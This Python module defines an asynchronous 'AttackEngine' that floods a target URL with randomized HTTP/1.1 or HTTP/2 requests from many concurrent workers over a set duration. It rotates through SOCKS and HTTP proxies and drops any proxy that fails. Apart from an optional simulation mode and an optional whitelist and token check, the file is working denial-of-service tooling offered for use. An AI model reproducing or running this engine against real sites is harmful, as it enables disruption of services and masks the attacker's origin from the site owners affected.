"""
Main attack engine with async implementation and HTTP/2 support.
"""

import asyncio
import time
import uuid
from datetime import datetime
from typing import Optional, Callable

import aiohttp
import httpx
from aiohttp_socks import ProxyConnector, ProxyType as SocksProxyType

from src.models import (
    AttackConfig,
    AttackMode,
    AttackStats,
    ProxyType,
    RequestResult,
)
from src.proxy_manager import ProxyManager
from src.request_builder import RequestBuilder
from src.logger import logger


class AttackEngine:
    """Main attack engine using asyncio for high performance."""

    def __init__(
        self,
        config: AttackConfig,
        proxy_manager: Optional[ProxyManager] = None,
    ):
        """
        Initialize AttackEngine.

        Args:
            config: Attack configuration.
            proxy_manager: Optional ProxyManager instance.
        """
        self.config = config
        self.proxy_manager = proxy_manager
        self.session_id = str(uuid.uuid4())

        # Statistics
        self.stats = AttackStats(
            session_id=self.session_id,
            target_url=config.target_url,
            mode=config.mode,
            start_time=datetime.now(),
        )

        # Request builder
        self.request_builder = RequestBuilder(
            target_url=config.target_url,
            mode=config.mode,
            custom_headers=config.custom_headers,
            cookies=config.cookies,
            post_data=config.post_data,
        )

        # Control flags
        self._running = False
        self._stop_event = asyncio.Event()

        # Callbacks
        self.on_request_complete: Optional[Callable[[RequestResult], None]] = None
        self.on_stats_update: Optional[Callable[[AttackStats], None]] = None

        logger.info(
            "attack_engine_initialized",
            session_id=self.session_id,
            target=config.target_url,
            mode=config.mode.value,
            simulation=config.simulation_mode,
        )

    async def start(self) -> AttackStats:
        """
        Start the attack with configured parameters.

        Returns:
            AttackStats with results.

        Raises:
            RuntimeError: If attack is already running.
            ValueError: If configuration is invalid.
        """
        if self._running:
            raise RuntimeError("Attack already running")

        # Validate configuration
        self._validate_config()

        # Check for simulation mode
        if self.config.simulation_mode:
            logger.warning("SIMULATION_MODE_ACTIVE - No real requests will be sent")
            return await self._run_simulation()

        self._running = True
        self.stats.start_time = datetime.now()

        logger.info(
            "attack_starting",
            target=self.config.target_url,
            threads=self.config.threads,
            duration=self.config.duration,
        )

        try:
            # Choose engine based on configuration
            if self.config.use_http2:
                await self._run_http2_attack()
            else:
                await self._run_aiohttp_attack()

        except Exception as e:
            logger.error("attack_failed", error=str(e), exc_info=True)
            raise
        finally:
            self._running = False
            self.stats.end_time = datetime.now()
            self.stats.calculate_metrics()

            if self.proxy_manager:
                proxy_stats = self.proxy_manager.get_stats()
                self.stats.total_proxies = proxy_stats["total"]
                self.stats.active_proxies = proxy_stats["active"]
                self.stats.failed_proxies = proxy_stats["dead"]

        logger.info(
            "attack_completed",
            session_id=self.session_id,
            total_requests=self.stats.total_requests,
            success_rate=f"{self.stats.success_rate:.2f}%",
            rps=f"{self.stats.requests_per_second:.2f}",
        )

        return self.stats

    def _validate_config(self) -> None:
        """Validate attack configuration."""
        # Check whitelist if enabled
        if self.config.require_authorization and not self.config.authorization_token:
            raise ValueError("Authorization token required but not provided")

        # Validate whitelist
        if self.config.whitelist:
            from urllib.parse import urlparse
            target_domain = urlparse(self.config.target_url).netloc
            if not any(domain in target_domain for domain in self.config.whitelist):
                raise ValueError(
                    f"Target {target_domain} not in whitelist: {self.config.whitelist}"
                )

    async def _run_simulation(self) -> AttackStats:
        """Run in simulation mode (no real requests)."""
        logger.info("running_simulation", duration=self.config.duration)

        start_time = time.time()
        simulated_rps = 100  # Simulate 100 req/s

        while time.time() - start_time < self.config.duration:
            await asyncio.sleep(0.1)
            # Simulate stats
            elapsed = time.time() - start_time
            self.stats.total_requests = int(elapsed * simulated_rps)
            self.stats.successful_requests = int(self.stats.total_requests * 0.95)
            self.stats.failed_requests = self.stats.total_requests - self.stats.successful_requests

            if self.on_stats_update:
                self.on_stats_update(self.stats)

        self.stats.end_time = datetime.now()
        self.stats.calculate_metrics()

        logger.info("simulation_complete", total_requests=self.stats.total_requests)
        return self.stats

    async def _run_aiohttp_attack(self) -> None:
        """Run attack using aiohttp (HTTP/1.1)."""
        semaphore = asyncio.Semaphore(self.config.threads)
        tasks = []

        # Create worker tasks
        for worker_id in range(self.config.threads):
            task = asyncio.create_task(
                self._aiohttp_worker(worker_id, semaphore)
            )
            tasks.append(task)

        # Schedule stop after duration
        asyncio.create_task(self._schedule_stop(self.config.duration))

        # Wait for all workers to complete
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _aiohttp_worker(self, worker_id: int, semaphore: asyncio.Semaphore) -> None:
        """
        Worker coroutine for aiohttp-based attacks.

        Args:
            worker_id: Unique worker identifier.
            semaphore: Semaphore to limit concurrency.
        """
        while not self._stop_event.is_set():
            async with semaphore:
                # Get proxy if available
                proxy = None
                proxy_url = None
                connector = None

                if self.proxy_manager:
                    proxy = self.proxy_manager.get_random_proxy()
                    if proxy:
                        # Create proxy connector
                        proxy_type_map = {
                            ProxyType.SOCKS4: SocksProxyType.SOCKS4,
                            ProxyType.SOCKS5: SocksProxyType.SOCKS5,
                            ProxyType.HTTP: SocksProxyType.HTTP,
                        }

                        connector = ProxyConnector(
                            proxy_type=proxy_type_map[proxy.proxy_type],
                            host=proxy.host,
                            port=proxy.port,
                            username=proxy.username,
                            password=proxy.password,
                        )

                try:
                    # Create session with connector
                    async with aiohttp.ClientSession(connector=connector) as session:
                        # Send multiple requests per connection
                        for _ in range(self.config.requests_per_connection):
                            if self._stop_event.is_set():
                                break

                            result = await self._send_aiohttp_request(
                                session, proxy.address if proxy else None
                            )

                            # Update stats
                            self._update_stats(result)

                            # Callback
                            if self.on_request_complete:
                                self.on_request_complete(result)

                            # Mark proxy as dead if it failed
                            if not result.success and proxy:
                                self.proxy_manager.mark_dead(proxy)
                                break  # Try new proxy

                except Exception as e:
                    logger.debug(f"worker_error", worker_id=worker_id, error=str(e))
                    if proxy and self.proxy_manager:
                        self.proxy_manager.mark_dead(proxy)

    async def _send_aiohttp_request(
        self, session: aiohttp.ClientSession, proxy_address: Optional[str]
    ) -> RequestResult:
        """Send a single HTTP request using aiohttp."""
        start_time = time.time()

        try:
            # Build request
            kwargs = self.request_builder.build_request_kwargs(randomize=True)
            method = self.request_builder.get_method()

            # Remove URL from kwargs (passed separately)
            url = kwargs.pop("url")

            # Convert timeout to aiohttp format
            timeout = aiohttp.ClientTimeout(total=kwargs.pop("timeout", 10))

            # Send request
            async with session.request(method, url, timeout=timeout, **kwargs) as response:
                response_time = time.time() - start_time
                await response.read()  # Consume response

                return RequestResult(
                    success=True,
                    status_code=response.status,
                    response_time=response_time,
                    proxy_used=proxy_address,
                )

        except asyncio.TimeoutError:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error="Timeout",
                proxy_used=proxy_address,
            )
        except Exception as e:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error=str(e),
                proxy_used=proxy_address,
            )

    async def _run_http2_attack(self) -> None:
        """Run attack using httpx with HTTP/2 support."""
        semaphore = asyncio.Semaphore(self.config.threads)
        tasks = []

        # Create worker tasks
        for worker_id in range(self.config.threads):
            task = asyncio.create_task(
                self._http2_worker(worker_id, semaphore)
            )
            tasks.append(task)

        # Schedule stop
        asyncio.create_task(self._schedule_stop(self.config.duration))

        # Wait for completion
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _http2_worker(self, worker_id: int, semaphore: asyncio.Semaphore) -> None:
        """Worker coroutine for HTTP/2 attacks using httpx."""
        while not self._stop_event.is_set():
            async with semaphore:
                # Get proxy
                proxy_url = None
                if self.proxy_manager:
                    proxy = self.proxy_manager.get_random_proxy()
                    if proxy:
                        proxy_url = proxy.url

                try:
                    # Create httpx client with HTTP/2
                    async with httpx.AsyncClient(
                        http2=True,
                        proxy=proxy_url,
                        verify=self.config.verify_ssl,
                        timeout=self.config.timeout,
                    ) as client:
                        # Send requests
                        for _ in range(self.config.requests_per_connection):
                            if self._stop_event.is_set():
                                break

                            result = await self._send_http2_request(client, proxy_url)
                            self._update_stats(result)

                            if self.on_request_complete:
                                self.on_request_complete(result)

                            if not result.success and proxy:
                                self.proxy_manager.mark_dead(proxy)
                                break

                except Exception as e:
                    logger.debug("http2_worker_error", worker_id=worker_id, error=str(e))

    async def _send_http2_request(
        self, client: httpx.AsyncClient, proxy_url: Optional[str]
    ) -> RequestResult:
        """Send HTTP/2 request using httpx."""
        start_time = time.time()

        try:
            kwargs = self.request_builder.build_request_kwargs(randomize=True)
            method = self.request_builder.get_method()
            url = kwargs.pop("url")
            kwargs.pop("timeout", None)  # Already set in client
            kwargs.pop("allow_redirects", None)  # Use follow_redirects in httpx

            response = await client.request(method, url, follow_redirects=False, **kwargs)
            response_time = time.time() - start_time

            return RequestResult(
                success=True,
                status_code=response.status_code,
                response_time=response_time,
                proxy_used=proxy_url,
            )

        except httpx.TimeoutException:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error="Timeout",
                proxy_used=proxy_url,
            )
        except Exception as e:
            return RequestResult(
                success=False,
                response_time=time.time() - start_time,
                error=str(e),
                proxy_used=proxy_url,
            )

    def _update_stats(self, result: RequestResult) -> None:
        """Update statistics with request result."""
        self.stats.total_requests += 1

        if result.success:
            self.stats.successful_requests += 1
            if result.status_code:
                self.stats.status_codes[result.status_code] = (
                    self.stats.status_codes.get(result.status_code, 0) + 1
                )
        else:
            self.stats.failed_requests += 1

        # Update response time stats
        if result.response_time > 0:
            if self.stats.min_response_time == 0:
                self.stats.min_response_time = result.response_time
            else:
                self.stats.min_response_time = min(
                    self.stats.min_response_time, result.response_time
                )

            self.stats.max_response_time = max(
                self.stats.max_response_time, result.response_time
            )

            # Update average (incremental)
            total_time = self.stats.avg_response_time * (self.stats.total_requests - 1)
            self.stats.avg_response_time = (
                total_time + result.response_time
            ) / self.stats.total_requests

    async def _schedule_stop(self, duration: int) -> None:
        """Schedule attack to stop after duration."""
        await asyncio.sleep(duration)
        logger.info("duration_reached_stopping", duration=duration)
        self._stop_event.set()

    async def stop(self) -> None:
        """Stop the attack gracefully."""
        logger.info("stopping_attack", session_id=self.session_id)
        self._stop_event.set()
        await asyncio.sleep(0.1)  # Allow workers to finish current requests

    def get_stats(self) -> AttackStats:
        """Get current statistics."""
        return self.stats
